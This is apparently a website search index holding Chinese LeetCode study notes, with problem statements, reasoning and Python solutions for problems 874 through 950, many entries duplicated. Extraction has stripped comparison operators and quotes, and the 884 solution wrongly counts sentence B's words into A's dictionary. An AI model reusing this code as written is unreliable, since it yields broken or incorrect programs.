forward [ currentForward ][ 0 ] * 1 , currentY + forward [ currentForward ][ 1 ] * 1 ] not in obstacles : currentX , currentY = currentX + forward [ currentForward ][ 0 ] * 1 , currentY + \\ forward [ currentForward ][ 1 ] * 1 res = max ( res , currentX ** 2 + currentY ** 2 ) if command == - 1 : currentForward = ( currentForward + 1 ) % 4 elif command == - 2 : currentForward = ( currentForward - 1 ) % 4 return res \u66b4\u529b\u8d85\u65f6\u4e86 \u4e8e\u662f\u5c1d\u8bd5\u5bf9 obstacles \u4f18\u5316 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution : def robotSim ( self , commands , obstacles ) - int : currentX , currentY = 0 , 0 obstacles = set ( map ( tuple , obstacles )) forward = [[ 0 , 1 ], [ 1 , 0 ], [ 0 , - 1 ], [ - 1 , 0 ]] currentForward = 0 res = 0 for command in commands : if command 0 : for tick in range ( command ): if ( currentX + forward [ currentForward ][ 0 ] * 1 , currentY + forward [ currentForward ][ 1 ] * 1 ) not in obstacles : currentX , currentY = currentX + forward [ currentForward ][ 0 ] * 1 , currentY + \\ forward [ currentForward ][ 1 ] * 1 res = max ( res , currentX ** 2 + currentY ** 2 ) if command == - 1 : currentForward = ( currentForward + 1 ) % 4 elif command == - 2 : currentForward = ( currentForward - 1 ) % 4 return res \u6cd5\u4e8c Todo \u601d\u8def\u4e00\u81f4\uff0c\u4e3a\u4ec0\u4e48\u6cd5\u4e00\u6548\u7387\u90a3\u4e48\u5dee\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def robotSim ( self , commands : List[int] , obstacles : List[List[int]] ) - int : obs = set (( x , y ) for x , y in obstacles ) x , y , d , sol = 0 , 0 , 0 , 0 dx , dy = 0 , 1 for c in commands : if c == - 2 : dx , dy = - dy , dx elif c == - 1 : dx , dy = dy , - dx else : for _ in range ( c ): if ( x + dx , y + dy ) in obs : break x += dx y += dy sol = max ( sol , x * x + y * y ) return sol","title":"871 880"},{"location":"LeetCode/vol 8/871-880/#874","text":"\u673a\u5668\u4eba\u5728\u4e00\u4e2a\u65e0\u9650\u5927\u5c0f\u7684\u7f51\u683c\u4e0a\u884c\u8d70\uff0c\u4ece\u70b9(0, 0)\u5904\u5f00\u59cb\u51fa\u53d1\uff0c\u9762\u5411\u5317\u65b9\u3002\u8be5\u673a\u5668\u4eba\u53ef\u4ee5\u63a5\u6536\u4ee5\u4e0b\u4e09\u79cd\u7c7b\u578b\u7684\u547d\u4ee4\uff1a 1 2 3 4 5 -2\uff1a\u5411\u5de6\u8f6c 90 \u5ea6 -1\uff1a\u5411\u53f3\u8f6c 90 \u5ea6 1 = x = 9\uff1a\u5411\u524d\u79fb\u52a8 x \u4e2a\u5355\u4f4d\u957f\u5ea6 \u5728\u7f51\u683c\u4e0a\u6709\u4e00\u4e9b\u683c\u5b50\u88ab\u89c6\u4e3a\u969c\u788d\u7269\u3002 \u7b2c i \u4e2a\u969c\u788d\u7269\u4f4d\u4e8e\u7f51\u683c\u70b9 (obstacles[i][0], obstacles[i][1]) \u5982\u679c\u673a\u5668\u4eba\u8bd5\u56fe\u8d70\u5230\u969c\u788d\u7269\u4e0a\u65b9\uff0c\u90a3\u4e48\u5b83\u5c06\u505c\u7559\u5728\u969c\u788d\u7269\u7684\u524d\u4e00\u4e2a\u7f51\u683c\u65b9\u5757\u4e0a\uff0c\u4f46\u4ecd\u7136\u53ef\u4ee5\u7ee7\u7eed\u8be5\u8def\u7ebf\u7684\u5176\u4f59\u90e8\u5206\u3002 \u8fd4\u56de\u4ece\u539f\u70b9\u5230\u673a\u5668\u4eba\u7684\u6700\u5927\u6b27\u5f0f\u8ddd\u79bb\u7684\u5e73\u65b9 \u60f3\u6cd5 \u5148\u66b4\u529b\u8bd5\u8bd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Solution : def robotSim ( self , commands , obstacles ) - int : currentX , currentY = 0 , 0 forward = [[ 0 , 1 ], [ 1 , 0 ], [ 0 , - 1 ], [ - 1 , 0 ]] currentForward = 0 res = 0 for command in commands : if command 0 : for tick in range ( command ): if [ currentX + forward [ currentForward ][ 0 ] * 1 , currentY + forward [ currentForward ][ 1 ] * 1 ] not in obstacles : currentX , currentY = currentX + forward [ currentForward ][ 0 ] * 1 , currentY + \\ forward [ currentForward ][ 1 ] * 1 res = max ( res , currentX ** 2 + currentY ** 2 ) if command == - 1 : currentForward = ( currentForward + 1 ) % 4 elif command == - 2 : currentForward = ( currentForward - 1 ) % 4 return res \u66b4\u529b\u8d85\u65f6\u4e86 \u4e8e\u662f\u5c1d\u8bd5\u5bf9 obstacles \u4f18\u5316","title":"874"},{"location":"LeetCode/vol 8/871-880/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 class Solution : def robotSim ( self , commands , obstacles ) - int : currentX , currentY = 0 , 0 obstacles = set ( map ( tuple , obstacles )) forward = [[ 0 , 1 ], [ 1 , 0 ], [ 0 , - 1 ], [ - 1 , 0 ]] currentForward = 0 res = 0 for command in commands : if command 0 : for tick in range ( command ): if ( currentX + forward [ currentForward ][ 0 ] * 1 , currentY + forward [ currentForward ][ 1 ] * 1 ) not in obstacles : currentX , currentY = currentX + forward [ currentForward ][ 0 ] * 1 , currentY + \\ forward [ currentForward ][ 1 ] * 1 res = max ( res , currentX ** 2 + currentY ** 2 ) if command == - 1 : currentForward = ( currentForward + 1 ) % 4 elif command == - 2 : currentForward = ( currentForward - 1 ) % 4 return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 8/871-880/#_2","text":"Todo \u601d\u8def\u4e00\u81f4\uff0c\u4e3a\u4ec0\u4e48\u6cd5\u4e00\u6548\u7387\u90a3\u4e48\u5dee\uff1f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def robotSim ( self , commands : List[int] , obstacles : List[List[int]] ) - int : obs = set (( x , y ) for x , y in obstacles ) x , y , d , sol = 0 , 0 , 0 , 0 dx , dy = 0 , 1 for c in commands : if c == - 2 : dx , dy = - dy , dx elif c == - 1 : dx , dy = dy , - dx else : for _ in range ( c ): if ( x + dx , y + dy ) in obs : break x += dx y += dy sol = max ( sol , x * x + y * y ) return sol","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 8/881-890/","text":"884 \u6211\u4eec\u7ed9\u51fa\u4e86\u4e24\u4e2a\u53e5\u5b50A\u548cB\uff08\u4e00\u4e2a\u53e5\u5b50\u662f\u4e00\u4e32\u7a7a\u683c\u5206\u9694\u7684\u5355\u8bcd\u3002\u6bcf\u4e2a\u5355\u8bcd\u53ea\u7531\u5c0f\u5199\u5b57\u6bcd\u7ec4\u6210\uff09 \u5982\u679c\u4e00\u4e2a\u5355\u8bcd\u5728\u5176\u4e2d\u4e00\u4e2a\u53e5\u5b50\u4e2d \u53ea\u663e\u793a\u4e00\u6b21 \uff0c \u5e76\u4e14\u4e0d\u51fa\u73b0\u5728\u53e6\u4e00\u4e2a\u53e5\u5b50\u4e2d \uff0c\u5219\u8be5\u5355\u8bcd\u4e0d\u5e38\u89c1 \u8fd4\u56de\u6240\u6709\u4e0d\u5e38\u89c1\u5355\u8bcd\u7684\u5217\u8868 \u60a8\u53ef\u4ee5\u6309\u4efb\u4f55\u987a\u5e8f\u8fd4\u56de\u5217\u8868 1 2 3 4 5 6 7 8 9 10 Example 1: Input: A = this apple is sweet , B = this apple is sour Output: [ sweet , sour ] Example 2: Input: A = apple apple , B = banana Output: [ banana ] \u60f3\u6cd5 \u6ca1\u5565\u60f3\u6cd5\uff0c\u6709\u90a3\u4e48\u7b80\u5355\u4e48\uff1f\u5b58\u7591 Todo \u770b\u770b\u5176\u4ed6\u4eba\u65b9\u6cd5 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 class Solution : def uncommonFromSentences ( self , A , B ): A_words = {} B_words = {} for word in A . split ( ): A_words [ word ] = A_words . get ( word , 0 ) + 1 for word in B . split ( ): A_words [ word ] = A_words . get ( word , 0 ) + 1 A_set = set ([ word for word , v in A_words . items () if v == 1 ]) B_set = set ([ word for word , v in B_words . items () if v == 1 ]) return list ( A_set . symmetric_difference ( B_set ))","title":"881 890"},{"location":"LeetCode/vol 8/881-890/#884","text":"\u6211\u4eec\u7ed9\u51fa\u4e86\u4e24\u4e2a\u53e5\u5b50A\u548cB\uff08\u4e00\u4e2a\u53e5\u5b50\u662f\u4e00\u4e32\u7a7a\u683c\u5206\u9694\u7684\u5355\u8bcd\u3002\u6bcf\u4e2a\u5355\u8bcd\u53ea\u7531\u5c0f\u5199\u5b57\u6bcd\u7ec4\u6210\uff09 \u5982\u679c\u4e00\u4e2a\u5355\u8bcd\u5728\u5176\u4e2d\u4e00\u4e2a\u53e5\u5b50\u4e2d \u53ea\u663e\u793a\u4e00\u6b21 \uff0c \u5e76\u4e14\u4e0d\u51fa\u73b0\u5728\u53e6\u4e00\u4e2a\u53e5\u5b50\u4e2d \uff0c\u5219\u8be5\u5355\u8bcd\u4e0d\u5e38\u89c1 \u8fd4\u56de\u6240\u6709\u4e0d\u5e38\u89c1\u5355\u8bcd\u7684\u5217\u8868 \u60a8\u53ef\u4ee5\u6309\u4efb\u4f55\u987a\u5e8f\u8fd4\u56de\u5217\u8868 1 2 3 4 5 6 7 8 9 10 Example 1: Input: A = this apple is sweet , B = this apple is sour Output: [ sweet , sour ] Example 2: Input: A = apple apple , B = banana Output: [ banana ] \u60f3\u6cd5 \u6ca1\u5565\u60f3\u6cd5\uff0c\u6709\u90a3\u4e48\u7b80\u5355\u4e48\uff1f\u5b58\u7591 Todo \u770b\u770b\u5176\u4ed6\u4eba\u65b9\u6cd5","title":"884"},{"location":"LeetCode/vol 8/881-890/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 class Solution : def uncommonFromSentences ( self , A , B ): A_words = {} B_words = {} for word in A . split ( ): A_words [ word ] = A_words . get ( word , 0 ) + 1 for word in B . split ( ): A_words [ word ] = A_words . get ( word , 0 ) + 1 A_set = set ([ word for word , v in A_words . items () if v == 1 ]) B_set = set ([ word for word , v in B_words . items () if v == 1 ]) return list ( A_set . symmetric_difference ( B_set ))","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 8/891-900/","text":"898 \u6709\u4e00\u7ec4\u975e\u8d1f\u6574\u6570\u6570\u7ec4A\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u8fde\u7eed\u7684\u5b50\u5e8f\u5217 B=[A[i],A[i+1],...,A[j]] \uff0c\u5bf9B\u7684\u6bcf\u4e2a\u5143\u7d20\u6309\u4f4d\u6216\uff0c\u5f97\u5230 A[i]|A[i+1]|...|A[j] \u8fd4\u56de\u53ef\u80fd\u7684\u7ed3\u679c\u6570 Example 1: 1 2 3 4 Input: [0] Output: 1 Explanation: There is only one possible result: 0. Example 2: 1 2 3 4 5 6 Input: [1,1,2] Output: 3 Explanation: The possible subarrays are [1], [1], [2], [1, 1], [1, 2], [1, 1, 2]. These yield the results 1, 1, 2, 1, 3, 3. There are 3 unique values, so the answer is 3. Example 3: 1 2 3 4 Input: [1,2,4] Output: 6 Explanation: The possible results are 1, 2, 3, 4, 6, and 7. \u60f3\u6cd5 \u6309\u4f4d\u6216\uff0c\u8fd4\u56de\u53ef\u80fd\u7684\u7ed3\u679c\u6570\uff0c\u611f\u89c9\u7c7b\u4f3c\u4e8e\u5168\u6392\u5217\uff1f\u90a3\u4e48\u6709\u4ec0\u4e48\u53ef\u80fd\u5f97\u5230\u7684\u89e3\u6cd5\u5417\uff1f \u5168\u6392\u5217\u7684\u8bdd\u3002\u3002\u3002\u9012\u5f52\uff1f \u6216\u8005\u662f\u52a8\u6001\u89c4\u5212\uff0c dp[i] \u4e3aA[i] \u4e3a\u7ed3\u5c3e\u7684\u6240\u6709\u5b50\u6570\u7ec4B\u7684\u5168\u90e8\u7ed3\u679c\uff1fset()\u4ec0\u4e48\u7684 \u90a3\u4e48\u3002\u3002\u3002\u3002 dp[i] = dp[i-1] | set([ b|A[i] for b in dp[i-1] ])? \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Solution : def subarrayBitwiseORs ( self , A ): if not A : return elif len ( A ) == 1 : return 1 dp = [{} for _ in range ( len ( A ))] dp [ 0 ] = set () dp [ 0 ] . add ( A [ 0 ]) res = set () | dp [ 0 ] for i in range ( 1 , len ( A )): dp [ i ] = { A [ i ] | b for b in dp [ i - 1 ] } | { A [ i ]} res |= dp [ i ] return len ( res ) 1 2 3 4 5 6 7 8 class Solution : def subarrayBitwiseORs ( self , A ): res = set () cur = set () for a in A : cur = { n | a for n in cur } | { a } res |= cur return len ( res )","title":"891 900"},{"location":"LeetCode/vol 8/891-900/#898","text":"\u6709\u4e00\u7ec4\u975e\u8d1f\u6574\u6570\u6570\u7ec4A\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u8fde\u7eed\u7684\u5b50\u5e8f\u5217 B=[A[i],A[i+1],...,A[j]] \uff0c\u5bf9B\u7684\u6bcf\u4e2a\u5143\u7d20\u6309\u4f4d\u6216\uff0c\u5f97\u5230 A[i]|A[i+1]|...|A[j] \u8fd4\u56de\u53ef\u80fd\u7684\u7ed3\u679c\u6570 Example 1: 1 2 3 4 Input: [0] Output: 1 Explanation: There is only one possible result: 0. Example 2: 1 2 3 4 5 6 Input: [1,1,2] Output: 3 Explanation: The possible subarrays are [1], [1], [2], [1, 1], [1, 2], [1, 1, 2]. These yield the results 1, 1, 2, 1, 3, 3. There are 3 unique values, so the answer is 3. Example 3: 1 2 3 4 Input: [1,2,4] Output: 6 Explanation: The possible results are 1, 2, 3, 4, 6, and 7. \u60f3\u6cd5 \u6309\u4f4d\u6216\uff0c\u8fd4\u56de\u53ef\u80fd\u7684\u7ed3\u679c\u6570\uff0c\u611f\u89c9\u7c7b\u4f3c\u4e8e\u5168\u6392\u5217\uff1f\u90a3\u4e48\u6709\u4ec0\u4e48\u53ef\u80fd\u5f97\u5230\u7684\u89e3\u6cd5\u5417\uff1f \u5168\u6392\u5217\u7684\u8bdd\u3002\u3002\u3002\u9012\u5f52\uff1f \u6216\u8005\u662f\u52a8\u6001\u89c4\u5212\uff0c dp[i] \u4e3aA[i] \u4e3a\u7ed3\u5c3e\u7684\u6240\u6709\u5b50\u6570\u7ec4B\u7684\u5168\u90e8\u7ed3\u679c\uff1fset()\u4ec0\u4e48\u7684 \u90a3\u4e48\u3002\u3002\u3002\u3002 dp[i] = dp[i-1] | set([ b|A[i] for b in dp[i-1] ])?","title":"898"},{"location":"LeetCode/vol 8/891-900/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Solution : def subarrayBitwiseORs ( self , A ): if not A : return elif len ( A ) == 1 : return 1 dp = [{} for _ in range ( len ( A ))] dp [ 0 ] = set () dp [ 0 ] . add ( A [ 0 ]) res = set () | dp [ 0 ] for i in range ( 1 , len ( A )): dp [ i ] = { A [ i ] | b for b in dp [ i - 1 ] } | { A [ i ]} res |= dp [ i ] return len ( res ) 1 2 3 4 5 6 7 8 class Solution : def subarrayBitwiseORs ( self , A ): res = set () cur = set () for a in A : cur = { n | a for n in cur } | { a } res |= cur return len ( res )","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 9/911-920/","text":"919 \u7f16\u5199\u4e00\u4e2a\u4f7f\u7528\u5b8c\u5168\u4e8c\u53c9\u6811\u521d\u59cb\u5316\u7684\u6570\u636e\u7ed3\u6784 CBTInserter \uff0c\u5e76\u652f\u6301\u4ee5\u4e0b\u64cd\u4f5c\uff1a CBTInserter(TreeNode root) \u4f7f\u7528\u5934\u8282\u70b9root\u521d\u59cb\u5316\u7ed9\u5b9a\u6811\u4e0a\u7684\u6570\u636e\u7ed3\u6784; CBTInserter.insert(int v) \u5c06\u63d2\u5165 node.val = v \u7684TreeNode\u8fdb\u5165\u5b8c\u5168\u4e8c\u53c9\u6811\uff0c\u540c\u65f6\u7ef4\u6301\u6811\u7684\u5b8c\u6574\u6027\uff0c\u5e76\u8fd4\u56de\u63d2\u5165\u7684TreeNode\u7684\u7236\u503c; CBTInserter.get_root() \u5c06\u8fd4\u56de\u6811\u7684\u5934\u8282\u70b9 \u60f3\u6cd5 \u6ca1\u4ec0\u4e48\u60f3\u6cd5\uff0c\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u63d2\u5165\u561b\uff0c\u7528\u6570\u7ec4\u4fdd\u5b58 \u8282\u70b9 i \u7684\u5de6\u5b69\u5b50\u5728\u6570\u7ec4\u7684 2*i \uff0c\u53f3\u5b69\u5b50\u5728\u6570\u7ec4\u7684 2*i+1 \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class CBTInserter : def __init__ ( self , root ): self . tree_data = [ root ] for i in self . tree_data : if i . left : self . tree_data . append ( i . left ) if i . right : self . tree_data . append ( i . right ) def insert ( self , v : int ): counts = len ( self . tree_data ) self . tree_data . append ( TreeNode ( v )) if counts % 2 : self . tree_data [( counts - 1 ) // 2 ] . left = self . tree_data [ - 1 ] else : self . tree_data [( counts - 1 ) // 2 ] . right = self . tree_data [ - 1 ] return self . tree_data [( counts - 1 ) // 2 ] . val def get_root ( self ): return self . tree_data [ 0 ]","title":"911 920"},{"location":"LeetCode/vol 9/911-920/#919","text":"\u7f16\u5199\u4e00\u4e2a\u4f7f\u7528\u5b8c\u5168\u4e8c\u53c9\u6811\u521d\u59cb\u5316\u7684\u6570\u636e\u7ed3\u6784 CBTInserter \uff0c\u5e76\u652f\u6301\u4ee5\u4e0b\u64cd\u4f5c\uff1a CBTInserter(TreeNode root) \u4f7f\u7528\u5934\u8282\u70b9root\u521d\u59cb\u5316\u7ed9\u5b9a\u6811\u4e0a\u7684\u6570\u636e\u7ed3\u6784; CBTInserter.insert(int v) \u5c06\u63d2\u5165 node.val = v \u7684TreeNode\u8fdb\u5165\u5b8c\u5168\u4e8c\u53c9\u6811\uff0c\u540c\u65f6\u7ef4\u6301\u6811\u7684\u5b8c\u6574\u6027\uff0c\u5e76\u8fd4\u56de\u63d2\u5165\u7684TreeNode\u7684\u7236\u503c; CBTInserter.get_root() \u5c06\u8fd4\u56de\u6811\u7684\u5934\u8282\u70b9 \u60f3\u6cd5 \u6ca1\u4ec0\u4e48\u60f3\u6cd5\uff0c\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u63d2\u5165\u561b\uff0c\u7528\u6570\u7ec4\u4fdd\u5b58 \u8282\u70b9 i \u7684\u5de6\u5b69\u5b50\u5728\u6570\u7ec4\u7684 2*i \uff0c\u53f3\u5b69\u5b50\u5728\u6570\u7ec4\u7684 2*i+1","title":"919"},{"location":"LeetCode/vol 9/911-920/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 class CBTInserter : def __init__ ( self , root ): self . tree_data = [ root ] for i in self . tree_data : if i . left : self . tree_data . append ( i . left ) if i . right : self . tree_data . append ( i . right ) def insert ( self , v : int ): counts = len ( self . tree_data ) self . tree_data . append ( TreeNode ( v )) if counts % 2 : self . tree_data [( counts - 1 ) // 2 ] . left = self . tree_data [ - 1 ] else : self . tree_data [( counts - 1 ) // 2 ] . right = self . tree_data [ - 1 ] return self . tree_data [( counts - 1 ) // 2 ] . val def get_root ( self ): return self . tree_data [ 0 ]","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 9/921-930/","text":"929 \u7ed9\u5b9a\u4e00\u7ec4email\u7684\u5b57\u7b26\u4e32\uff0c\u6839\u636e\u89c4\u5219\u6e05\u6d17\uff0c\u8fd4\u56de\u6e05\u6d17\u540e\u7684\u6709\u6548email\u5730\u5740\u4e2a\u6570 \u89c4\u5219 localname\u4e2d\uff0c . \u5ffd\u7565\uff0c + \u540e\u7684localname\u5ffd\u7565\uff0c\u4fdd\u7559domainname \u6cd5\u4e00 \u66b4\u529b\u5b8c\u6210 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def numUniqueEmails ( self , emails ) - int : res = set () for email in emails : cleanString = [] i = 0 while i len ( email ) and email [ i ] != @ : if email [ i ] == . : i += 1 elif email [ i ] == + : while email [ i ] != @ : i += 1 else : cleanString . append ( email [ i ]) i += 1 cleanString += email [ i :] res . add ( . join ( cleanString )) return len ( res ) \u6cd5\u4e8c 1 2 3 4 5 6 7 8 9 10 class Solution : def numUniqueEmails ( self , emails : List[str] ) - int : res = set () for email in emails : name , domain = email . split ( @ ) name = name . split ( + )[ 0 ] name = name . replace ( . , ) res . add ( {}@{} . format ( name , domain )) return len ( res )","title":"921 930"},{"location":"LeetCode/vol 9/921-930/#929","text":"\u7ed9\u5b9a\u4e00\u7ec4email\u7684\u5b57\u7b26\u4e32\uff0c\u6839\u636e\u89c4\u5219\u6e05\u6d17\uff0c\u8fd4\u56de\u6e05\u6d17\u540e\u7684\u6709\u6548email\u5730\u5740\u4e2a\u6570 \u89c4\u5219 localname\u4e2d\uff0c . \u5ffd\u7565\uff0c + \u540e\u7684localname\u5ffd\u7565\uff0c\u4fdd\u7559domainname","title":"929"},{"location":"LeetCode/vol 9/921-930/#_1","text":"\u66b4\u529b\u5b8c\u6210 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 class Solution : def numUniqueEmails ( self , emails ) - int : res = set () for email in emails : cleanString = [] i = 0 while i len ( email ) and email [ i ] != @ : if email [ i ] == . : i += 1 elif email [ i ] == + : while email [ i ] != @ : i += 1 else : cleanString . append ( email [ i ]) i += 1 cleanString += email [ i :] res . add ( . join ( cleanString )) return len ( res )","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 9/921-930/#_2","text":"1 2 3 4 5 6 7 8 9 10 class Solution : def numUniqueEmails ( self , emails : List[str] ) - int : res = set () for email in emails : name , domain = email . split ( @ ) name = name . split ( + )[ 0 ] name = name . replace ( . , ) res . add ( {}@{} . format ( name , domain )) return len ( res )","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 9/931-940/","text":"938 \u7ed9\u5b9a\u4e8c\u53c9\u641c\u7d22\u6811\u7684\u6839\u8282\u70b9\uff0c\u8fd4\u56deL\u548cR\uff08\u5305\u62ec\uff09\u4e4b\u95f4\u7684\u503c\u7684\u6240\u6709\u8282\u70b9\u7684\u503c\u7684\u603b\u548c\u3002 \u4e8c\u8fdb\u5236\u641c\u7d22\u6811\u4fdd\u8bc1\u5177\u6709\u552f\u4e00\u503c 1 2 3 4 5 6 Input: root = [10,5,15,3,7,null,18], L = 7, R = 15 Output: 32 10 5 15 3 7 None 18 \u60f3\u6cd5 \u60f3\u8981\u5f97\u5230\u4e24\u4e2a\u8282\u70b9\u4e4b\u95f4\u7684\u8282\u70b9\uff0c\u9700\u8981\u904d\u5386 \u4e8c\u53c9\u641c\u7d22\u6570\uff0c \u4e2d\u5e8f\u904d\u5386\uff1f \u6cd5\u4e00 1 2 3 4 5 6 7 8 9 10 11 class Solution : def rangeSumBST ( self , root : TreeNode , L : int , R : int ) - int : return self . midOrder ( root , 0 , L , R ) def midOrder ( self , root : TreeNode , res , L , R ): if root : res = self . midOrder ( root . left , res , L , R ) if root . val = L and root . val = R : res += root . val res = self . midOrder ( root . right , res , L , R ) return res \u6cd5\u4e8c \u8fd9\u91cc\u4f7f\u7528stack\u51cf\u5c11\u4e86\u904d\u5386\u7684\u6b21\u6570 \u8fd9\u91cc\u7a0d\u5fae\u6709\u70b9\u8ff7\u7cca 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def rangeSumBST ( self , root : TreeNode , L : int , R : int ) - int : stack = [ root ] ans = 0 while stack : node = stack . pop () if node : # \u7b26\u5408\u8981\u6c42\u7684 if L = node . val = R : ans += node . val if L node . val : stack . append ( node . left ) if node . val R : stack . append ( node . right ) return ans","title":"931 940"},{"location":"LeetCode/vol 9/931-940/#938","text":"\u7ed9\u5b9a\u4e8c\u53c9\u641c\u7d22\u6811\u7684\u6839\u8282\u70b9\uff0c\u8fd4\u56deL\u548cR\uff08\u5305\u62ec\uff09\u4e4b\u95f4\u7684\u503c\u7684\u6240\u6709\u8282\u70b9\u7684\u503c\u7684\u603b\u548c\u3002 \u4e8c\u8fdb\u5236\u641c\u7d22\u6811\u4fdd\u8bc1\u5177\u6709\u552f\u4e00\u503c 1 2 3 4 5 6 Input: root = [10,5,15,3,7,null,18], L = 7, R = 15 Output: 32 10 5 15 3 7 None 18 \u60f3\u6cd5 \u60f3\u8981\u5f97\u5230\u4e24\u4e2a\u8282\u70b9\u4e4b\u95f4\u7684\u8282\u70b9\uff0c\u9700\u8981\u904d\u5386 \u4e8c\u53c9\u641c\u7d22\u6570\uff0c \u4e2d\u5e8f\u904d\u5386\uff1f","title":"938"},{"location":"LeetCode/vol 9/931-940/#_1","text":"1 2 3 4 5 6 7 8 9 10 11 class Solution : def rangeSumBST ( self , root : TreeNode , L : int , R : int ) - int : return self . midOrder ( root , 0 , L , R ) def midOrder ( self , root : TreeNode , res , L , R ): if root : res = self . midOrder ( root . left , res , L , R ) if root . val = L and root . val = R : res += root . val res = self . midOrder ( root . right , res , L , R ) return res","title":"\u6cd5\u4e00"},{"location":"LeetCode/vol 9/931-940/#_2","text":"\u8fd9\u91cc\u4f7f\u7528stack\u51cf\u5c11\u4e86\u904d\u5386\u7684\u6b21\u6570 \u8fd9\u91cc\u7a0d\u5fae\u6709\u70b9\u8ff7\u7cca 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class Solution : def rangeSumBST ( self , root : TreeNode , L : int , R : int ) - int : stack = [ root ] ans = 0 while stack : node = stack . pop () if node : # \u7b26\u5408\u8981\u6c42\u7684 if L = node . val = R : ans += node . val if L node . val : stack . append ( node . left ) if node . val R : stack . append ( node . right ) return ans","title":"\u6cd5\u4e8c"},{"location":"LeetCode/vol 9/941-950/","text":"950 \u5728\u4e00\u526f\u724c\u4e2d\uff0c\u6bcf\u5f20\u724c\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u6574\u6570\uff0c\u53ef\u4ee5\u6309\u7167\u4efb\u4f55\u987a\u5e8f\u6392\u5e8f\u5957\u724c\u3002 \u6700\u521d\uff0c\u6240\u6709\u724c\u90fd\u5728\u4e00\u4e2a\u724c\u7ec4\u4e2d\u9762\u671d\u4e0b \u91cd\u590d\u6267\u884c\u4ee5\u4e0b\u6b65\u9aa4\uff0c\u76f4\u5230\u663e\u793a\u6240\u6709\u5361\u7247\uff1a \u62ff\u8d77\u684c\u4e0a\u7684\u6700\u9876\u4e0a\u724c\uff0c\u9732\u51fa\u5b83\uff0c\u7136\u540e\u5c06\u5b83\u4ece\u684c\u4e0a\u53d6\u4e0b\u6765 \u5982\u679c\u724c\u7ec4\u4e2d\u4ecd\u6709\u724c\uff0c\u5219\u5c06\u724c\u7ec4\u7684\u4e0b\u4e00\u5f20\u9876\u724c\u653e\u5728\u724c\u7ec4\u7684\u5e95\u90e8 \u5982\u679c\u4ecd\u6709\u672a\u663e\u793a\u7684\u5361\uff0c\u8bf7\u8fd4\u56de\u6b65\u9aa41.\u5426\u5219\uff0c\u505c\u6b62\u8be5\u5faa\u73af \u8fd4\u56de\u5c06\u4ee5\u9012\u589e\u987a\u5e8f\u663e\u793a\u5361\u7247\u7684\u724c\u7ec4\u7684\u987a\u5e8f \u9898\u76ee\u662f\u7279\u6b8a\u7684\u6392\u5e8f\u624b\u6bb5 1 2 3 4 5 6 7 8 9 10 11 12 13 Input: [17,13,11,2,3,5,7] Output: [2,13,3,11,5,17,7] Explanation: We get the deck in the order [17,13,11,2,3,5,7] (this order doesn t matter), and reorder it. After reordering, the deck starts as [2,13,3,11,5,17,7], where 2 is the top of the deck. We reveal 2, and move 13 to the bottom. The deck is now [3,11,5,17,7,13]. We reveal 3, and move 11 to the bottom. The deck is now [5,17,7,13,11]. We reveal 5, and move 17 to the bottom. The deck is now [7,13,11,17]. We reveal 7, and move 13 to the bottom. The deck is now [11,17,13]. We reveal 11, and move 17 to the bottom. The deck is now [13,17]. We reveal 13, and move 17 to the bottom. The deck is now [17]. We reveal 17. Since all the cards revealed are in increasing order, the answer is correct. \u60f3\u6cd5 \u9996\u5148\u5148\u81ea\u5df1\u6392\u4e2a\u5e8f\uff1f \u9700\u8981\u4f7f\u7528\u961f\u5217\uff1f \u8fd8\u662f\u60f3\u7528\u6392\u5e8f\u597d\u7684\u6570\u7ec4 \u9006\u5e8f \u6765\u5efa\u7acb \u5176\u4ed6 Todo 1 2 3 4 5 6 7 class Solution : def deckRevealedIncreasing ( self , deck ): ind = list ( range ( len ( deck ))) for num in sorted ( deck ): deck [ ind [ 0 ]] = num ind = ind [ 2 :] + [ ind [ 1 ]] if len ( ind ) 1 else [] return deck","title":"941 950"},{"location":"LeetCode/vol 9/941-950/#950","text":"\u5728\u4e00\u526f\u724c\u4e2d\uff0c\u6bcf\u5f20\u724c\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u6574\u6570\uff0c\u53ef\u4ee5\u6309\u7167\u4efb\u4f55\u987a\u5e8f\u6392\u5e8f\u5957\u724c\u3002 \u6700\u521d\uff0c\u6240\u6709\u724c\u90fd\u5728\u4e00\u4e2a\u724c\u7ec4\u4e2d\u9762\u671d\u4e0b \u91cd\u590d\u6267\u884c\u4ee5\u4e0b\u6b65\u9aa4\uff0c\u76f4\u5230\u663e\u793a\u6240\u6709\u5361\u7247\uff1a \u62ff\u8d77\u684c\u4e0a\u7684\u6700\u9876\u4e0a\u724c\uff0c\u9732\u51fa\u5b83\uff0c\u7136\u540e\u5c06\u5b83\u4ece\u684c\u4e0a\u53d6\u4e0b\u6765 